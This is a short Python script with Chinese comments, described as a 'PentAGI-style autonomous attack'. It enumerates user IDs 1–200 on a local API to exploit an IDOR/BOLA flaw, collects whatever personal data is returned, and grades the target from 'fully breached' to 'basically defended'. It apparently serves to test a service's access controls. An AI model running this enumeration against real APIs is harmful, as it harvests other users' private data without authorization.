# PentAGI 式自主攻击：枚举 /api/user/1..200，高频抓取 PII（IDOR/BOLA）
import sys, time, json, urllib.request
PORT = sys.argv[1]
TOKEN = sys.argv[2] if len(sys.argv) > 2 else None   # 攻击者持有自己账号的 token(42)
base = f"http://127.0.0.1:{PORT}/api/user/"
leaked, codes = [], {}
t0 = time.time()
for i in range(1, 201):
    req = urllib.request.Request(base + str(i))
    if TOKEN: req.add_header("Authorization", "Bearer " + TOKEN)
    try:
        r = urllib.request.urlopen(req, timeout=5)
        codes[200] = codes.get(200, 0) + 1
        leaked.append(json.loads(r.read()))
    except urllib.error.HTTPError as e:
        codes[e.code] = codes.get(e.code, 0) + 1
    except Exception:
        codes["err"] = codes.get("err", 0) + 1
dt = time.time() - t0
print(f"耗时 {dt:.1f}s  状态码分布 {codes}")
print(f"窃取到的用户 PII 条数: {len(leaked)} / 200")
if leaked[:1]: print("示例泄露:", leaked[0])
print("判定:", "完全失守(拖库成功)" if len(leaked) > 50 else
      ("基本防住(仅能看自己)" if len(leaked) <= 1 else "部分泄露"))
